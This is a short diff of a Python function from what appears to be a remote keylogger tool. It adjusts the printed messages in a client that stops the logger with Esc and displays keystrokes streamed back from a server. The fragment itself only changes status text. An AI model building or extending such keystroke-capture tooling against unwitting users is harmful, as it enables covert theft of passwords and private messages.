@@ -10,8 +10,8 @@ def key_logger(client_socket):
     def on_press(key):
         # Stop the keylogger locally and notify the server when 'Esc' is pressed
         if key == keyboard.Key.esc:
-            client_socket.sendall("STOP_KEY_LOGGER".encode())
-            print("Sent command to stop keylogger.")
+            client_socket.sendall("STOP_KEY_LOGGER".encode()) 
+            print("Stopping keylogger...")  
             return False
         else:
             print(f'Key {key} pressed')  # For debugging
@@ -25,11 +25,11 @@ def key_logger(client_socket):
 
                 # Kiểm tra và không in thông báo nếu là lệnh KEYLOGGER_STOPPED
                 if decoded_data == "KEYLOGGER_STOPPED":
-                    print("Keylogger stopped by server. Returning to main menu...")
+                    print("\n Keylogger stopped by server. Returning to main menu...\n")
                     break
 
                 if not data:
-                    print("No more data received. Exiting...")
+                    print("No more data received. Exiting...\n")
                     break
                 print(decoded_data, end='')  # Print received keystrokes
         except Exception as e:
